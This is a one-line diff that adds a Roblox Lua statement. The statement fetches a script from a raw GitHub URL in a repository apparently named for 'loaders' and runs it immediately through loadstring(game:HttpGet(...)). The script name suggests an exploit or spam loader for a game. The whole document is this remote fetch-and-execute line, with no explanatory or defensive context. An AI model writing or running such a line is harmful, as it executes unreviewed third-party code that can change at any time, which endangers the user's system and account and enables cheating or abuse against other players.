@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/deltarune-fight-expanded-spam2-gqedhrbwh0bbby.lua"))()
